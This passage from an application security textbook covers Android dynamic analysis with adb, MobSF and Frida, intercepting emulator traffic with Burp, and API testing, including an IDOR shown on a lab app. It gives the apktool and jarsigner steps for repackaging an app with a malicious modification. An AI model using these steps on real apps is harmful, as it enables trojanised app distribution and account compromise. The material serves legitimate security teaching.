The file shows the username and auth token are stored. This is the same auth token we evaluated in [Chapter 10](#ch10.xhtml): Session Management, which showed that it was not random but could be guessed. The tokens also do not expire. This storage allows a malicious user to modify it and gain access to other users' accounts.

Several best practices must be implemented to mitigate the risks associated with improper credential usage, which are as follows:

*   First and foremost, avoid using hardcoded credentials, as they are susceptible to discovery by attackers. Instead, opt for a secure and dynamic credential management approach.
*   User credentials should be handled with the utmost care—encrypt them during transmission and refrain from storing them in plaintext on the device.
*   Employ secure, revocable access tokens as an alternative, implementing robust user authentication protocols.
*   Regularly updating and rotating API keys or tokens adds an extra layer of security, ensuring a dynamic defense against evolving threats to user credentials.

By adhering to these measures, the integrity of user authentication is strengthened, bolstering the overall security posture of the mobile application.

[Inadequate supply chain security](#contents.xhtml_sc3_266a)

Supply chain vulnerabilities in mobile applications refer to the risks and weaknesses introduced through the various components, dependencies, and third-party libraries integrated into the application during the development process. These could be from a malicious employee deliberately inserting malicious code in the build process or a vulnerable 3rd party library or application included via accident. These vulnerabilities can lead to security breaches, data leaks, or unauthorized access. Ensuring the security of the entire supply chain, from third-party libraries to backend services, is crucial to safeguarding mobile applications against potential exploitation and ensuring the integrity of the software ecosystem.

One way to attack the supply chain would be to repackage the application and release a malicious version. To repackage the application, follow these simple steps:

1. Decompile the app using apktool. This was seen in [Chapter 15](#ch15.xhtml): Static Analysis of Java Android Applications and is done with the following command:

Java -jar apktool_2.8.1.jar d example.apk

2. Modify the app in smali. The modification is to perform a malicious purpose. The malicious modification may change a server call to steal information or add a more prominent malware component.

3. Repackage the app using . apktool to build the new version. This is done by using apktool's b parameter and specifying the folder that contains the code to build.

4. Resign the app using jarsigner. Jarsigner is an Oracle tool that is included in your JDK install. The command to run this would be the following:

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykeystore.keystore example.apk myAlias

Here, example.apk is the application to sign. The parameter mykeystore is the keystore that contains the signing key under the alias myAlias. More information is available at [https://download.oracle.com/otn_hosted_doc/jdeveloper/904preview/jdk14doc/docs/tooldocs/solaris/jarsigner.html](https://download.oracle.com/otn_hosted_doc/jdeveloper/904preview/jdk14doc/docs/tooldocs/solaris/jarsigner.html).

Fixing supply chain issues involves vetting 3rd party libraries to ensure they are from trusted sources and having a policy and procedure for updating all 3rd party components. A secure application signing and distribution process helps ensure an attacker does not modify and release your code. Having checks in the software development lifecycle, such as code review and security awareness training, helps stop malicious employees.

[Insecure authentication/authorization](#contents.xhtml_sc3_267a)

Mobile applications often suffer from insecure authentication and authorization practices. This can lead to various vulnerabilities, compromising user identification and access control. Failure to correctly identify users when required or neglecting to maintain their identity introduces critical security lapses. Weaknesses in session management and authorization decisions on the client side, along with vulnerabilities like forced browsing, can amplify the risk and allow unauthorized access to sensitive information. To ensure users' secure and seamless interaction with mobile applications, robust authentication and authorization mechanisms must be implemented to thwart these threats effectively.

Detailed information on exploiting and fixing many of these vulnerabilities is given earlier in [Chapter 10](#ch10.xhtml): Session Management and [Chapter 11](#ch11.xhtml): Authorization Practices. Those were web application specific, but many are also applicable to mobile applications. There is also an overlap with findings under improper credential storage and several upcoming vulnerabilities.

[Insufficient input/output validation](#contents.xhtml_sc3_268a)

Insufficient input/output validation vulnerability is a common security issue in mobile applications that can lead to severe technical and business impacts. Attackers can exploit this vulnerability by manipulating user input or output data, resulting in code execution, data breaches, system compromise, or application disruptions. This category includes almost all injections, including SQL, XSS, and XML. These vulnerabilities were covered in depth in [Chapter 4](#ch04.xhtml): Observability with SQL Injections. Exploiting those vulnerabilities will be generally the same. One possible difference is that SQLite versions are often used on Android and may be encountered. For SQLite syntax, please see: [https://www.sqlite.org/lang.html](https://www.sqlite.org/lang.html).

To mitigate this vulnerability, developers must implement proper data validation and sanitization techniques and avoid incorporating untrusted data directly into the application's logic. Regular security testing and code reviews can help identify and fix potential vulnerabilities. Failure to address insufficient input/output validation can lead to reputational harm, legal and compliance issues, and loss of customer trust, affecting the organization's overall business performance. Detailed information on fixing these vulnerabilities can be found in [Chapter 4](#ch04.xhtml), Observability with SQL Injections.

[Insecure communication](#contents.xhtml_sc3_269a)

Modern mobile applications exchange data with remote servers through the mobile device's carrier network and the internet. However, a threat agent listening on the wire can intercept and change the data if transmitted in plaintext or using a deprecated encryption protocol. This can lead to severe impacts such as account takeover, identity theft, and personally identifiable information (PII) data leaks. PII is any data or set of data that can be used to uniquely identify an individual. So, for example, email address and driver’s license number are both PII, but age is not since there is only one person with a specific driver’s license number or email address, but many people have the same age. It is recommended to use SSL/TLS to transport all data, apply strong cipher suites, use certificates signed by trusted CA providers, and avoid mixed SSL sessions to prevent insecure communication. Testing insecure communication will be covered in detail in [Chapter 17](#ch17.xhtml): Network Analysis of Java Android Applications.

Insecure communication is a common risk affecting a mobile device's communication technologies. This can occur during mobile-to-mobile communications, application-to-server communications, or mobile-to-something-else communications. The usual risks of insecure communication are data integrity, data confidentiality, and origin integrity. It is best to assume that the network layer is not secure and is susceptible to eavesdropping to prevent this risk. Therefore, applying SSL/TLS to all transport channels that the mobile app uses to send data to a backend API or web service is essential. Additionally, using certificates signed by trusted CA providers and avoiding bad SSL certificates is vital. This covers poor handshaking, incorrect SSL versions, weak negotiation, cleartext communication of sensitive assets, and other related issues.

[Inadequate privacy controls](#contents.xhtml_sc3_270a)

PII, such as names, addresses, credit card information, and more, are valuable to attackers who can use them for fraudulent activities, blackmail, or damaging the victim's critical data. Obtaining PII requires attackers to breach security on another level, but developers' careless handling of PII can make an app vulnerable to privacy infringements. While privacy violations usually have little technical impact on the system, they can have severe business impacts, including breaches of legal regulations, financial damage due to victims' lawsuits, reputational damage, and loss or theft of PII.

An app can only be vulnerable to inadequate privacy controls if it processes some form of personally identifiable information. This is almost always the case, given that client apps' IP addresses, logs, and metadata sent with crash reports or analytics are considered PII. An app may expose PII through insecure data storage and communication, data access with insecure authentication and authorization, and insider attacks on the app's sandbox. It is essential to process PII with the possibility that an attacker could access communication and storage media to prevent privacy violations.

There are many ways to leak PII, which can overlap with other issues. One way PII could be revealed is in the logs. These can be checked by clicking Logcat at the bottom of Android Studio. The drop-down on the left allows us to select the emulator or tethered device. Then, in the textbox to the right type of the main package of the application and view the logs, as shown in the following figure:

![](images/Figure_16.14.png)

Figure 16.14: Logs for habit helper mobile application

The logs show usernames, attempted passwords, and several backend API calls in this case. Usernames can be considered PII; although passwords should be protected and not logged, they are not generally considered PII.

[Insufficient binary protections](#contents.xhtml_sc3_271a)

Attackers can target mobile application binaries for various reasons. These attackers can use different methods, such as reverse engineering and code tampering, to attack application binaries. These attacks can lead to valuable information leaks, application manipulation, and even the distribution of malicious code. While all applications are vulnerable to binary attacks, those with sensitive data or algorithms hardcoded into their binary are particularly at risk.

Binary attacks can have moderate technical and business impacts. Technological impacts include leakage of secrets and manipulation of the binaries, which can arbitrarily change how applications work. Business impacts include significant costs, reputational damage, and the potential loss of intellectual property. Defending against binary attacks is an ongoing process that requires a balance between the effort put into measures against binary attacks and the potential gain from that effort.

This category includes the analysis of the final core binary, which helps determine its source code, libraries, algorithms, and other assets. This analysis is demonstrated in [Chapter 15](#ch15.xhtml):  Static Analysis of Java Android Applications.

[Security misconfiguration](#contents.xhtml_sc3_272a)

Mobile applications are prone to security misconfigurations that can arise from improper security settings, permissions, and controls. Sometimes, developers may include hidden backdoor functionality or internal development security controls that should not be released into a production environment. For example, a developer may accidentally leave a password as a comment in a hybrid application, or they may disable two-factor authentication during testing. Threat actors with physical access to the device or who have installed malicious applications can exploit these misconfigurations to gain unauthorized access to sensitive data or perform malicious actions. These security misconfigurations can be exploited through attack vectors, including insecure default settings, improper access controls, weak encryption or hashing, lack of secure communication, unprotected storage, insecure file permissions, and misconfigured session management.

One of the most common misconfigurations in mobile apps is a misconfigured activity, service, or receiver. These can often be identified in the AndroidManifest.xml with the flag android:exported="true". If this is found, you can start and bypass controls starting or manipulating it via adb. One example of this in the Habit Helper app would be to start the secret menu using the following command:

adb shell am start com.securitymagick.habithelper.SecretMenuActivity

This is shown below:

![](images/Figure_16.15.png)

Figure 16.15: Start an activity with adb

In this case, it does not start, as this activity was not exported. However, this extraneous functionality can be accessed manually using the clues in the source code found in [Chapter 15](#ch15.xhtml), Static Analysis of Java Android Applications, as shown in the following figure:

![](images/Figure_16.16.png)

Figure 16.16: Access secret menu

Security misconfigurations are common in mobile apps due to time constraints, lack of awareness, or human development errors. Detecting security misconfigurations is relatively easy through manual code review, security testing, or automated scanning tools. Misconfigurations can have significant technical impacts, such as unauthorized access to sensitive data, account hijacking or impersonation, data breaches, and compromise of backend systems. They can also have severe business impacts, such as financial loss, data loss or theft, downtime and disruption, and damage to brand reputation. Mobile apps should be appropriately configured to follow security best practices to avoid security misconfigurations. This includes:

*   Reviewing default settings
*   Using secure communication channels
*   Implementing strong access controls
*   Applying necessary security updates and patches
*   Properly storing sensitive data
*   Configuring file provider path settings

Organizations should also conduct regular security testing and vulnerability assessments to ensure that their mobile apps are secure and free from vulnerabilities. By following these best practices, organizations can reduce the risk of security misconfigurations and protect their mobile apps from potential threats and attacks.

[Insecure data storage](#contents.xhtml_sc3_273a)

Mobile applications with insecure data storage can be vulnerable to various threat agents who aim to exploit vulnerabilities and gain unauthorized access to sensitive information. These threat agents may include malicious insiders within the organization, cybercriminals seeking financial gain, state-sponsored actors conducting cyber espionage, activists, and industrial spies seeking a competitive advantage. Attack vectors can include unauthorized access to the device's file system, intercepting data transmissions, and using malware or malicious applications installed on the device.

Testing for this generally includes checking the shared preferences and local SQLite databases. SQLite is an open-source, lightweight embedded database that is stored in a single file and does not require any installation. For example, let us look at how local SQLite databases can be accessed and queried. You can access the local databases using SQLite3, found in ../Android/SDK/platform-tools/. Use the adb pull command to copy the database locally for querying. The databases are located on the mobile device at/data/data/<package>/<databaseName>.db.

Some base commands are .help, .tables, and .dump <tableName>. Note that each of those commands starts with a period.

Mobile applications that store data insecurely can have serious consequences. These include data breaches, unauthorized access to user accounts, tampering, and damage to the organization's reputation and trust. Therefore, mobile application developers and organizations must implement strong encryption, secure storage measures, and strict access controls to reduce these risks. To protect sensitive data, it is recommended to use encrypted shared preferences and the keystore. These measures can help prevent unauthorized access to application resources and ensure user data remains safe and secure.

[Insufficient cryptography](#contents.xhtml_sc3_274a)

Mobile applications that use insecure cryptography are vulnerable to attacks compromising sensitive information's confidentiality, integrity, and authenticity. This vulnerability can be exploited by various threat agents, including attackers who target cryptographic algorithms or implementations, malicious insiders, state-sponsored actors, cybercriminals, and attackers who leverage vulnerabilities in cryptographic protocols or libraries. This category does not apply when sensitive data that should be encrypted is not or anything related to network communication, which are both covered in other categories. This category is for when cryptography was attempted but done incorrectly or insecurely. Insecure cryptography in a mobile application can lead to data breaches, unauthorized access to user accounts, compromised confidentiality, or the ability to forge or tamper with data. It can severely impact businesses, causing loss of customer trust, reputational damage, loss of intellectual property, financial losses, and non-compliance with regulations.

To mitigate the risk of insufficient cryptography, mobile applications should adopt strong and modern hash functions and cryptographic algorithms and follow the best encryption and key management practices to ensure data integrity and confidentiality. Regular security audits and updates are also crucial to maintain the highest level of protection against potential threats. Businesses must prioritize the security of their mobile applications to prevent unauthorized access to sensitive data and potential financial and reputational damage.

[Dynamic analysis](#contents.xhtml_sc2_275a)

Dynamic analysis examines and evaluates a program's behavior during runtime or execution. Unlike static analysis, which scrutinizes the code without executing it, dynamic analysis involves assessing the application's real-time interactions, responses, and performance. Examples of dynamic analysis include runtime debugging, memory modification, and penetration testing, all aimed at uncovering vulnerabilities, optimizing performance, and ensuring the robustness of the software during its active execution. The following subsections will look at how to do manual dynamic analysis and how to use two tools to help with dynamic analysis.

[Manual dynamic analysis](#contents.xhtml_sc3_276a)

Manual dynamic analysis is done by a person as opposed to a tool. Some ways to perform dynamic analysis manually have already been discussed. These are as follows:

*   Using adb to view or modify shared preferences.
*   Repackaging the apk file to include an attack.
*   Reading confidential information from log files.
*   Bypassing authentication/authorization by manually starting a misconfigured activity.
*   Bypassing authentication/authorization by sending maliciously crafted data to a vulnerable receiver.
*   Query/update local SQLite databases on the mobile device.
*   Attacking cryptography done wrong, i.e. crypto key is stored, or encryption is done clientside.
*   Other attacks, such as injection, authorization, and authentication attacks, were covered in the web application parts of this book.

This is by no means the only way to manually perform dynamic analysis. Continue learning and practicing with resources mentioned in the conclusion of [Chapter 17](#ch17.xhtml): Network Analysis of Java Android Applications.

MobSF

As we saw in [Chapter 15](#ch15.xhtml): Static Analysis of Java Android Applications, the Mobile Security Framework is an open-source, free tool that provides static and dynamic analysis for Android and iOS applications. Please refer [Chapter 15](#ch15.xhtml) for details on downloading and setting up this tool.

In addition to the setup required for static analysis, the dynamic analyzer has to be set up with an emulater or VM on which to run the application. This can be an Android emulator, such as we have been using in this chapter, or a Genymotion VM. You may need to set the ANALYZER_IDENTIFIER in ~/.MobSF/config.py or via the environment variable MOBSF_ANALYZER_IDENTIFIER. Then, start the dynamic analysis by clicking Start  Dynamic Analysis, as shown in the following figure:

![](images/Figure_16.17.png)

Figure 16.17: MobSF starts dynamic analysis

Then, the dynamic analysis will open, and several options will be in the top menu, as seen in [Figure 16.18](#ch16.xhtml_fig16-18):

![](images/Figure_16.18.png)

Figure 16.18: MobSF Dynamic Analysis menu

You can click on the options and perform many of the same attacks discussed earlier in an automated fashion.

[Frida](#contents.xhtml_sc4_277a)

Frida is an open-source runtime instrumentation framework that allows users to inject JavaScript code into processes on various platforms like Windows, Linux, macOS, native Android, and iOS apps. It offers powerful APIs that provide extensive functionality, making debugging, instrumenting, or manipulating applications easier. Frida can be injected into a process by running the Frida server on the device, and it can also be embedded as a shared library into a mobile app.

Frida provides two modes of operation—injected and embedded. The framework offers several powerful features, such as hooking, inspecting, instrumenting, and manipulating functions of an app. Additionally, it allows users to attach to an existing app using its PID or application identifier (Frida-ps) or spawn a new process using the CLI argument. Frida also provides a Frida CLI and Frida scripts that can be used to write scripts in JS or wrapped with Python and injected directly into the process. The .overload() function is commonly used when hooking functions with multiple implementations.

Some common Java APIS used in Frida are:

*   Java. Perform (fn): Ensure the current thread is attached to the Java VM.
*   Java. Use (className): Dynamically get a JavaScript wrapper for className that you can instantiate objects from by calling $new().
*   console.log(‘Script executed'): JavaScript function to print a message on the console.
*   setTimeout(func, delay[, ...parameters]): Delay function call.
*   Memory.scan(address, size, pattern, callbacks): Scan memory for patterns.

Let us walkthrough the Frida install. Frida must be installed on your test machine and the Android Device or Emulator. Frida is a Python application, so to install Frida on your test machine, use pip to install Frida-tools.

Then, verify that the Frida install worked by running the command:

frida-ps

If it returns a list of processes, then it is functioning.

Follow these instructions to install Frida on Android:

1. Download the Frida server for your Android platform. You can download the Frida servers from their release page ([https://github.com/frida/frida/releases](https://github.com/frida/frida/releases)).

2. Once you have downloaded the Frida server zip file, unzip it and rename the filename to frida-sever.

3. Copy the Frida-server file into the Android phone’s tmp directory and change the permissions.

adb push frida-server /data/local/tmp/

adb shell “chmod 755 /data/local/tmp/frida-server”

4. Then, start the server.

adb shell “/data/local/tmp/frida-server &”

5. Verify the installation is working by running frida-ps. You should see a list of processes running on the Android Emulator.

6. If it does not work, forward the default Frida port 27042 from your Android device to your test machine.

adb forward tcp:27042 tcp:27042

After installing, we can check the command line help, which is shown in the following figure:

![](images/Figure_16.19.png)

Figure 16.19: Frida help

To run Frida, the command is:

Frida -n package -l fridatest.js

Where -n specifies the name to attach to, and the -l is the javascript to attach. Use -U to connect to a USB device.

Frida has many prewritten scripts that you can use as is. Many penetration testers have shared their scripts at [https://codeshare.frida.re/](https://codeshare.frida.re/). We can even run a script from codeshare without downloading it with the command:

Frida -n package --codeshare scriptName

It is also relatively easy to figure out how to write custom scripts. Please continue learning about Frida at: [https://frida.re/docs/javascript-api/](https://frida.re/docs/javascript-api/). An example of using a prewritten script to bypass certificate pinning is in [Chapter 17](#ch17.xhtml): Network Analysis of Java Android Applications.

[Conclusion](#contents.xhtml_sc2_278a)

In this chapter, you have gained valuable knowledge about the dynamic analysis of Java Android applications. You have learned how to set up Android emulators, use the Android Debug Bridge, and understand the OWASP Mobile Top 10 to navigate the dynamic landscape of mobile security. Through hands-on experience and step-by-step walkthroughs for manual exploitation, you have gained a deeper understanding of the vulnerabilities that may exist within Android applications. You have also been introduced to MobSF and Frida, which can be used for automated dynamic analysis and efficiently detecting and mitigating security risks. With these skills, you are now better equipped to enhance the security of Android applications. The next chapter will teach us about the Android Network attack surface and API testing.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 17Network Analysis of Java Android Applications](#contents.xhtml_ch17a)

[Introduction](#contents.xhtml_sc2_279a)

Understanding how an application communicates with its backend is essential in mobile application security. This chapter focuses on mobile application network analysis, particularly Android applications developed in Java. Through a comprehensive exploration, we will guide you through essential techniques such as proxying network traffic from an Android emulator, discovering API endpoints, conducting API endpoint testing, and overcoming the challenges of certificate pinning. This hands-on journey will equip you with the skills to intercept and analyze network traffic, identify API endpoints, and navigate the complexities of testing mobile APIs. By the end of this chapter, you will know how to enhance the security of mobile applications through practical network analysis and testing methodologies.

[Structure](#contents.xhtml_sc2_280a)

This chapter will discuss network analysis of Android applications written in Java and mobile API testing. We will discuss:

*   Proxying network traffic on an Android device
*   Finding API endpoints
*   API testing
*   Securing APIs
*   Bypassing Certificate Pinning

There will be step-by-step walkthroughs of setting up your network proxy, help for common issues, and several API testing examples.

[Objectives](#contents.xhtml_sc2_281a)

By the end of this chapter, you will understand how to use Burp Suite with an Android emulator to proxy network traffic. You will learn several methods to find endpoints to test. We will discuss the basic guidelines of API endpoint testing and how they differ from web applications. You will also understand certificate pinning and ways to bypass it.

[Proxying network traffic on an Android device](#contents.xhtml_sc2_282a)

This section will explain how to set up a proxy on the network for an Android Emulator or rooted device. It is important to note that security standards are subject to frequent changes within Android applications, and as such, these steps may change accordingly. This walk-through demonstrates the steps to set up proxying on an Android Emulator running API 25:

1.  Start up an Android emulator or rooted Android device. We should start our emulator permissively using the following command:

    .\emulator.exe -avd Pixel_4_XL_API_25 -selinux permissive -writable-system

2.  Set up a Burp Suite proxy to listen to all interfaces. From the Proxy tab, select the Option subtab, then select your listener and click the Edit button. Then select all interfaces as shown in the following figure:

    ![](images/2.png)

    Figure 17.1: Setting Burp Proxy to all interfaces

3.  In our Android emulator’s network settings, add a proxy pointing to Burp Suite, which is shown as follows:

    ![](images/Figure_17.2.png)

    Figure 17.2: Setting up Proxy on Emulator

4.  Download the certificate from Burp Suite. First, go to the options tab of the proxy tool, and click on the Import/Export CA certificate. A new window will pop up. Select from the export list Certificate in DER format and then click the Next button. The next window allows you to choose a download location. After clicking Next, the certificate will be downloaded. This is illustrated in the subsequent figure:

    ![](images/Figure_17.3.png)

    Figure 17.3: Saving Burp Suite certificate

5.  Use openssl to change the certificate to .pem filetype and rename to follow the Android naming conventions:

    openssl x509 -inform DER -in cacert.Der -out cacert.pem

    openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1

    mv cacert.pem <hash>.0

6.  Using adb, restart the adb instance as root. Push file to SD card for installation:

    ./adb root

    ./adb push <file> /sdcard

7.  Use adb to start a root shell, and copy the file from sd card to /system/etc/security/cacerts:

    ./adb disable-verity

    ./adb remount

    ./adb shell

    mv /sd.card/<file>/system/etc/security/cacerts

8.  Reboot the emulator.

When the emulator restarts, Burp Suite should capture all application network traffic. If the network traffic is not being captured, check that you followed the steps and check for any security changes that may affect your results. If you cannot find any issues, your application may use certificate pinning or a different protocol that is not HTTP. Certificate pinning can be bypassed but adds an extra layer of complexity. Techniques for bypassing certificate pinning are presented in a later section entitled Bypassing Certificate Pinning. If you suspect the application is using a different protocol to send data, then you will need to look for clues as to what protocol is being used. Static analysis of the source code covered in [Chapter 15](#ch15.xhtml), Static Analysis of Java Android Applications, would be a good place to find this information. After identifying the protocol, you will have to search for tools and methods to intercept this traffic.

[API testing](#contents.xhtml_sc2_283a)

Different types of APIs or web services are commonly used in the industry. The two protocols that will be discussed in depth are Simple Object Access Protocol (SOAP) and Representational State Transfer (REST). SOAP messaging protocol uses Extensible Markup Language (XML) and is considered more robust than older XML-based protocols. On the other hand, REST is more of a principle than a protocol. Generally, it uses HTTP verbs and meaningful URLs. Data is often, but not always, passed in JavaScript Object Notation (JSON). Most companies use REST for new services but may maintain SOAP services. There are two other protocols that might be encountered in specialized applications. Both use a Remote Procedure Call (RPC) and send different data formats over HTTP. These are JSON-RPC and XML-RPC. As can be inferred from their names, JSON-RPC protocol uses a RPC to send JSON objects over HTTP, and XML-RPC likewise uses a RPC to send XML over HTML.

API endpoints in scope for testing are often provided in a file. When they are not, we need to use other techniques to find them, which will be discussed in the following subsection.

[Finding API endpoints](#contents.xhtml_sc3_284a)

There are several strategies to locate API endpoints for testing.

One method to find API endpoints is to examine the application's source code is discussed in [Chapter 15](#ch15.xhtml), Static Analysis of Java Android Applications. The source code might contain helpful information about API endpoints and their requests. The following figure illustrates the source code displayed in JD-GUI, including comments showing how to extract API endpoints, parameters, and usage.

![](images/Figure_17.4.png)

Figure 17.4: Decompiled source code shows two API endpoints

The above figure shows the reversed code making REST API requests. Two API endpoints are discovered. The first API endpoint gets a user’s score and sends a GET request to the endpoint:  http://ntisl091:8080/rest/provider/{username}. The second API endpoint sends a JSON object composed of a username and score through a PUT request to the endpoint: [http://ntisl091:8080/rest/provider/](http://ntisl091:8080/rest/provider/). The base API endpoint in both cases could have been overwritten by an entry in the shared preference file, so that should be checked for completeness.

Another approach to locating endpoints is using Android Studio Debugger is covered in [Chapter 16](#ch16.xhtml),  Dynamic Analysis of Java Android Applications. The debugger can provide information about endpoint calls and responses. Following is an example where the API logs endpoint calls, revealing information to the tester:

![](images/Figure_17.5.png)

Figure 17.5: Log file revealing endpoints

An alternative approach is to use a network proxy while using the application, which allows us to observe which APIs the application calls. This involves using the application as a regular user and examining any API calls recorded in the history or target tabs of Burp Suite.

[API definition files](#contents.xhtml_sc3_285a)

Another approach to finding API endpoints is to search for API definition files, such as Web Services Description Language (WSDL), Web Application Description Language (WADL), or SWAGGER files. These files provide a structured way to describe the functionality offered by a web service, making it easier for developers to consume and integrate these services into their applications. Now, let us briefly examine each file type and where they are generally located.

WSDL is an XML-based language used to describe the functionalities provided by a web service. It is a standardized way to describe a web service's available operations, messages, and network endpoints. The URL to the WSDL file is often structured as follows: [http://example.com/path/to/service?wsdl](http://example.com/path/to/service?wsdl).

WADL is an XML-based language that describes the functionalities and resources provided by a web application, particularly those exposed through a RESTful API. Like WSDL for web services, WADL aims to provide a machine-readable description of the available resources and their interactions within a web application. WADL files are typically hosted on the web server providing the RESTful API. The URL to the WADL file is often structured similarly to the following: [http://example.com/path/to/api/application.wadl](http://example.com/path/to/api/application.wadl).

A Swagger file, OpenAPI Specification, is a machine-readable document defining RESTful APIs. It provides a standardized way to describe the structure of an API, including details about available endpoints, operations, request/response formats, authentication methods, and more. Swagger/OpenAPI Specification is widely used for API documentation, testing, and client code generation. Swagger files are typically hosted on the web server, providing the API documentation. The URL to the Swagger file often follows a pattern like the following: [http://example.com/path/to/api/swagger.json](http://example.com/path/to/api/swagger.json) or [http://example.com/path/to/api/swagger.yaml](http://example.com/path/to/api/swagger.yaml).

If the swagger file is not at the default location and the website is publicly available online, try Google hacking to locate the files. A search for a WADL file on example.com would be site:example.com filetype:wadl. Details on Google hacking were covered in [Chapter 2](#ch02.xhtml), Reconnaissance and Mapping.

If we do not have a WSDL, WADL, or SWAGGER, we can use content enumeration detailed in [Chapter 2](#ch02.xhtml) to check for common API names.

[Basic API testing procedure](#contents.xhtml_sc3_286a)

Many aspects of API testing have been covered in the previous chapters and will be referred to as necessary.

First, check the Transport Layer Security (TLS) certificate and ciphers. Weak ciphers, not using TLS or an old version, could make the API vulnerable to man-in-the-middle attacks. We can use Nmap for this testing. This can be done using the command nmap -p 443 -script +ssl-enum-ciphers domain. The output from this command is shown in the following figure:

![](images/Figure_17.6.png)

Figure 17.6: Nmap enum-ciphers

We have shown each type of TLS supported and each cipher with a grade.

Next, check that requests that require authentication enforce it and that the authentication mechanism is not brute forceable. Please see [Chapter 9](#ch09.xhtml), Authentication Protocols, for details on authentication testing. Generally speaking, each endpoint requiring authentication should be tested as an unauthenticated user to see if it still works. The authentication code should have implemented a defense against brute forcing passwords, such as throttling or multi-factor authentication.

Verify that authorization is enforced. Follow the authorization testing guidelines in [Chapter 11](#ch11.xhtml), Authorization Practices. Be ever vigilant for IDORs, which are common in API endpoints.

Also, check for any business logic vulnerabilities and sequential process flow outlined in [Chapter 8](#ch08.xhtml), Executing Business Logic Vulnerabilities.

If any CORs requests exist, follow the testing procedure in [Chapter 6](#ch06.xhtml), CORs Exploitation.

Backend injections should be tested, as seen in [Chapter 4](#ch04.xhtml), Observability with SQL Injections. However, some attacks, like Cross-Site Scripting (XSS), require testing with the API consumer and cannot be confirmed in API testing alone.

For user-controlled input, we should perform at least a quick fuzz test. This can be done using Burp Suite Intruder, which can be used to perform fuzzing with a quick fuzz list. [Chapter 4](#ch04.xhtml), Observability with SQL Injection has a subsection called Burp Suite Fuzzing, demonstrating Burp Suite Intruder. An example of short fuzz list is given in the following figure:

![](images/Figure_17.7.png)

Figure 17.7: Quick Input Fuzzing List

Some additional API tests must be run using Burp Repeater. Burp Repeater was demonstrated in [Chapter 5](#ch05.xhtml), Misconfiguration with Default Values in the subsection SQL Injection via User-Agent.

These additional tests are listed as follows:

1. Try to switch HTTP Verbs. For example, change PUT to POST or vice versa. A request’s authentication and authorization requirements may vary with the HTTP verb. If you identify a different verb that works, then authentication and authorization testing should be repeated with the new HTTP Verb.

2. Try made-up HTTP Verbs. Try SANTA or ILOVECATS. This may get a verbose error message when everything else works perfectly.

3. Try switching Content-Types. The resource may be interpreted as HTML if the header needs to be set correctly. This can lead to XSS vulnerabilities, assuming another vulnerability allows untrusted input in the HTTP response.

4. Try changing HTTP protocols. Changing the protocol can cause different parsing on the request, which may mean different code gets run. Other protocols may mean various vulnerabilities.

5. Try changing the Host header. Burp Suite will still send the request to the same IP; it does not use the Host in the request for the target. This shows if any part of the request depends on that host. Try 127.0.0.1 and other hosts like [google.com](https://google.com) to see if anything changes in the response.

[API testing examples](#contents.xhtml_sc3_287a)

One API Endpoint discovered through source code analysis as well as network proxy was the PUT request to [http://127.0.0.1:8081/rest/provider/Lizzie](http://127.0.0.1:8081/rest/provider/Lizzie), which takes JSON data in the format of {“userName”:”Lizzie”,”score”:3}. This request updates the score of the user Lizzie to be 3\. The application increments Lizzie’s current score by one every time the resist button is pushed and sends this request. Usage as a regular user is shown in the following figure:

![](images/3.png)

Figure 17.8: Call to the API Endpoint

The request has an Insecure Direct Object Reference (IDOR) in the username field. This is shown in [Figure 17.9](#ch17.xhtml_fig17-9), where the user Hacker updates their score from Lizzie’s request:

![](images/4.png)

Figure 17.9: IDOR in API Endpoint

This also has other issues. The hacker is not a registered user. So, this request logically should not have updated a user who does not exist.

Also, clicking the resist button should update a score by 1. This API will update the score to any number sent, as seen in the above request. The following figure shows an even more significant logic vulnerability in this field:

![](images/5.png)

Figure 17.10: Negative score

Here, John’s score is updated to a negative number. A negative should be impossible in this scenario.

This API is hugely broken, having authentication, authorization, and business logic vulnerabilities.

This API could be fixed in several ways. First, we should not send in the score to be updated at all. When a request is sent for a user, that user’s score should be incremented by 1\. The tokens generated via the loginAtRest API call shown in the following figure could be sent instead of a username:

![](images/6.png)

Figure 17.11: Login at Rest API Call

Then, the API can validate the token to get the username, as shown in the following figure:

![](images/7.png)

Figure 17.12: Validate Token API

This would enforce a valid registered user being used. As those tokens were shown to be bruteforceable in [Chapter 9](#ch09.xhtml), Authentication Protocols, we have not fixed the authentication or authorization issues. To fix the authentication and authorization issues, upgrading this token to a properly implemented JWT would fix these issues.

[Securing APIs](#contents.xhtml_sc2_288a)

There are many guidelines for writing secure APIs. Generally, API definition files should only be publicly available if they need to be public.

For all web services, it is vital to ensure Transport Confidentiality. To achieve this, SSL/TLS must be used. Additionally, TLS should be used to authenticate the service provider to the service consumer. When verifying the server certificate, the service consumer should ensure that a trusted provider issues it, that it is not expired or revoked, and that it matches the service’s domain name. Furthermore, the service consumer should either sign a document with the associated public key or successfully decrypt something encrypted.

[Rest APIs](#contents.xhtml_sc3_289a)

This section on securing REST APIs includes several secure coding techniques that can be used to safeguard APIs. Input validation is critical for ensuring input parameters are trusted and verified. This validation can be accomplished using solid types such as numbers, booleans, dates, times, or fixed data ranges in API parameters. Restricting string inputs with regex and rejecting any unexpected or illegal content is essential. Validation frameworks or sanitization libraries from your specific programming language are also recommended.

Also, validating content types is an essential technique in API development. It involves documenting all the supported content types in your API and rejecting requests with unexpected or missing content headers. This can be done using the HTTP response status codes 406 Unacceptable or 415 Unsupported Media Type. It is also crucial to ensure proper hardening of XML parsers for XML content types. Defining content types is also highly recommended as it helps to avoid accidentally exposing unintended content types. This, in turn, helps explicitly to prevent XXE-attack vectors.

To defend against header injection, it is essential to restrict HTTP methods by applying an allowlist of permitted HTTP methods such as GET, POST, and PUT. All requests not matching the allowlist should be rejected with HTTP response code 405 – Method not allowed. It is also essential to ensure the caller is authorized to use the incoming HTTP method on the resource collection, action, and record.

